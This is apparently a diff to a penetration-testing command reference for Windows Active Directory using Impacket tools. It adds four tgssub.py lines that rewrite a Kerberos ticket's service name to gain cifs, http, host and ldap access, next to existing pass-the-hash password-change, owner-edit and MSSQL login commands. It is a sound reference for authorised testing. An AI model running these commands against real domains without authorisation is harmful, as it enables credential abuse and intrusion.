@@ -71,3 +71,7 @@ changepasswd.py -newpass '123Pentest!!!' -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"
 owneredit.py -action write -new-owner "$NEW_OWNER" -target "$TARGET_OBJECT" "$DOMAIN"/"$USER":"$PASSWORD"
 mssqlclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
 describeTicket.py "$CCACHE_PATH"
+tgssub.py -in "$CCACHE_PATH" -altservice "cifs/$HOSTNAME.$DOMAIN" -out newticket-cifs.ccache
+tgssub.py -in "$CCACHE_PATH" -altservice "http/$HOSTNAME.$DOMAIN" -out newticket-http.ccache
+tgssub.py -in "$CCACHE_PATH" -altservice "host/$HOSTNAME.$DOMAIN" -out newticket-host.ccache
+tgssub.py -in "$CCACHE_PATH" -altservice "ldap/$HOSTNAME.$DOMAIN" -out newticket-ldap.ccache
